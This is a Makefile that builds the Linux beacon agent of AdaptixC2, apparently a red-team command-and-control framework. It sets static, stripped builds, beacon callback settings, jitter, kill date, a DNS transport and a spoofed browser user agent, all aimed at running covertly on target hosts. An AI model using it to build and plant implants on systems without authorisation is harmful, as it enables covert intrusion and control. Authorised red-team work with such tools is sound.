# AdaptixC2 Linux agent (C++ implementation)
# The server-side plugin (pl_main.go) invokes this Makefile with the same
# variables below. Each value is escaped into config.h at build time.

CXX      ?= g++
TARGET   ?= agent_linux_amd64
BUILD    ?= build

# Prefer a static musl toolchain when it is available.  This keeps the
# payload free of glibc version requirements (GLIBC_2.34+, GLIBC_2.38+).
# The server plugin currently passes CXX=g++, so we explicitly override it
# here; for arm64 the corresponding aarch64 musl toolchain is used if
# installed, otherwise the plugin-provided toolchain is left untouched.
TARGET_ARCH := $(if $(findstring arm64,$(TARGET)),arm64,amd64)
MUSL_ARCH := $(if $(findstring arm64,$(TARGET_ARCH)),aarch64,x86_64)
MUSL_PREFIX ?= /opt/$(MUSL_ARCH)-linux-musl-cross/bin
MUSL_CXX := $(MUSL_PREFIX)/$(MUSL_ARCH)-linux-musl-g++
HAVE_MUSL := $(shell test -x "$(MUSL_CXX)" && echo 1 || echo 0)
MUSL_OPENSSL_PREFIX ?= /opt/openssl-musl

ifeq ($(HAVE_MUSL),1)
  override CXX := $(MUSL_CXX)
  BASE_CXXFLAGS ?= -std=c++20 -O2 -g0 -s -fvisibility=hidden -fno-ident -pthread -static
  BASE_LDFLAGS  ?= -static
  OPENSSL_CFLAGS := -I$(MUSL_OPENSSL_PREFIX)/include
  OPENSSL_LDFLAGS := -L$(MUSL_OPENSSL_PREFIX)/lib64
  BUILD_TAG := musl
else
  BASE_CXXFLAGS ?= -std=c++20 -O2 -g0 -s -fvisibility=hidden -fno-ident -pthread
  BASE_LDFLAGS  ?= -static-libstdc++ -static-libgcc
  OPENSSL_CFLAGS :=
  OPENSSL_LDFLAGS :=
  BUILD_TAG := native
endif
BUILD := $(BUILD)/$(BUILD_TAG)/$(TARGET_ARCH)

# Defaults (BeaconHTTP)
HOST           ?= 127.0.0.1
PORT           ?= 80
HOSTS          ?=
PORTS          ?=
TLS_CIPHERS    ?=
USE_SSL        ?= false
URI            ?= /
HB_HEADER      ?= X-HB-Data
USER_AGENT     ?= Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36
ENC_KEY        ?= 00000000000000000000000000000000
WATERMARK      ?= 1f2e3d4c
ANS_PRE        ?= 0
ANS_SUF        ?= 0
RECONN         ?= 10
JITTER         ?= 0
KILL_DATE      ?=
WORKING_TIME   ?=
TRANSPORT      ?= http
DNS_DOMAIN     ?=
DNS_PKT_SIZE   ?= 4096
DNS_ENC_KEY    ?= 00000000000000000000000000000000
DNS_RESOLVER   ?=
TCP_BANNER     ?=
TCP_USE_SSL    ?= false
TCP_CLIENT_CERT ?=
TCP_CLIENT_KEY  ?=
TCP_CA_CERT     ?=

CXXFLAGS ?= $(BASE_CXXFLAGS)
LDFLAGS  ?= $(BASE_LDFLAGS)

# config.h is written by the server plugin *before* invoking make (with
# SKIP_CONFIG=1). Derive feature flags from config.h instead of from make
# variables so the prebuilt plugin does not need to be rebuilt.
config_value = $(shell awk -v key="$(1)" '$$1=="#define" && $$2==key { gsub(/"/,"",$$3); print $$3 }' config.h)
AGENT_USE_SSL_VALUE     = $(call config_value,AGENT_USE_SSL)
AGENT_TCP_USE_SSL_VALUE = $(call config_value,AGENT_TCP_USE_SSL)
AGENT_TRANSPORT_VALUE   = $(call config_value,AGENT_TRANSPORT)

OPENSSL_NEEDED = $(filter true,$(AGENT_USE_SSL_VALUE) $(AGENT_TCP_USE_SSL_VALUE))
DNS_NEEDED     = $(filter dns,$(AGENT_TRANSPORT_VALUE))

DEFS   = $(if $(OPENSSL_NEEDED),-DAGENT_WITH_OPENSSL=1) $(if $(DNS_NEEDED),-DAGENT_WITH_DNS=1)
LDLIBS = $(if $(OPENSSL_NEEDED),-lssl -lcrypto) $(if $(DNS_NEEDED),-lresolv)

CXXFLAGS += $(if $(OPENSSL_NEEDED),$(OPENSSL_CFLAGS))
LDFLAGS  += $(if $(OPENSSL_NEEDED),$(OPENSSL_LDFLAGS))

SOURCES := agent.cpp msgpack.cpp crypto.cpp tasks.cpp transports.cpp miniz.cpp
OBJECTS := $(patsubst %.cpp,$(BUILD)/%.o,$(SOURCES))

.PHONY: all config clean

all: config $(TARGET)

$(TARGET): $(OBJECTS)
	$(CXX) $(CXXFLAGS) $(LDFLAGS) -o $@ $(OBJECTS) $(LDLIBS)

$(BUILD)/%.o: %.cpp config.h
	@mkdir -p $(BUILD)
	$(CXX) $(CXXFLAGS) $(DEFS) -c -o $@ $<

ifneq ($(SKIP_CONFIG),1)
config: config.h

config.h: Makefile
	@echo '/* generated by Makefile */' > $@
	@echo '#pragma once' >> $@
	@echo '#define AGENT_HOST "$(HOST)"' >> $@
	@echo '#define AGENT_PORT "$(PORT)"' >> $@
	@echo '#define AGENT_HOSTS "$(HOSTS)"' >> $@
	@echo '#define AGENT_PORTS "$(PORTS)"' >> $@
	@echo '#define AGENT_TLS_CIPHERS "$(TLS_CIPHERS)"' >> $@
	@echo '#define AGENT_USE_SSL "$(USE_SSL)"' >> $@
	@echo '#define AGENT_URI "$(URI)"' >> $@
	@echo '#define AGENT_HB_HEADER "$(HB_HEADER)"' >> $@
	@echo '#define AGENT_USER_AGENT "$(USER_AGENT)"' >> $@
	@echo '#define AGENT_ENC_KEY "$(ENC_KEY)"' >> $@
	@echo '#define AGENT_WATERMARK "$(WATERMARK)"' >> $@
	@echo '#define AGENT_ANS_PRE "$(ANS_PRE)"' >> $@
	@echo '#define AGENT_ANS_SUF "$(ANS_SUF)"' >> $@
	@echo '#define AGENT_RECONN "$(RECONN)"' >> $@
	@echo '#define AGENT_JITTER "$(JITTER)"' >> $@
	@echo '#define AGENT_KILL_DATE "$(KILL_DATE)"' >> $@
	@echo '#define AGENT_WORKING_TIME "$(WORKING_TIME)"' >> $@
	@echo '#define AGENT_TRANSPORT "$(TRANSPORT)"' >> $@
	@echo '#define AGENT_DNS_DOMAIN "$(DNS_DOMAIN)"' >> $@
	@echo '#define AGENT_DNS_PKT_SIZE "$(DNS_PKT_SIZE)"' >> $@
	@echo '#define AGENT_DNS_ENC_KEY "$(DNS_ENC_KEY)"' >> $@
	@echo '#define AGENT_DNS_RESOLVER "$(DNS_RESOLVER)"' >> $@
	@echo '#define AGENT_TCP_BANNER "$(TCP_BANNER)"' >> $@
	@echo '#define AGENT_TCP_USE_SSL "$(TCP_USE_SSL)"' >> $@
	@echo '#define AGENT_TCP_CLIENT_CERT "$(TCP_CLIENT_CERT)"' >> $@
	@echo '#define AGENT_TCP_CLIENT_KEY "$(TCP_CLIENT_KEY)"' >> $@
	@echo '#define AGENT_TCP_CA_CERT "$(TCP_CA_CERT)"' >> $@

endif

clean:
	rm -rf $(BUILD) config.h $(TARGET) agent_linux_amd64 agent_linux_arm64
